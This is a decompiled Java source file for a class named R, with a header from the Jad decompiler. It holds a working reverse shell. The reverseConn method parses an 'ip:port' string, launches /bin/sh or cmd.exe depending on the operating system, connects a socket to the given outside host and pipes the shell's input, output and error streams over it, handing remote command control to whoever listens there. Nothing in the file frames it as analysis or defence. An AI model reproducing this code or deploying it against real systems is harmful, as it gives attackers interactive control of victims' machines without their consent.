// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.kpdus.com/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   R.java

import java.net.Socket;

public class R
{

    public R(String ip)
    {
        reverseConn(ip);
    }

    public void reverseConn(String ip)
    {
        String ipport = ip;
        try
        {
            String ShellPath;
            if(System.getProperty("os.name").toLowerCase().indexOf("windows") == -1)
                ShellPath = new String("/bin/sh");
            else
                ShellPath = new String("cmd.exe");
            Socket socket = new Socket(ipport.split(":")[0], Integer.parseInt(ipport.split(":")[1]));
            Process process = Runtime.getRuntime().exec(ShellPath);
            (new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();
            (new StreamConnector(process.getErrorStream(), socket.getOutputStream())).start();
            (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }
    }
}
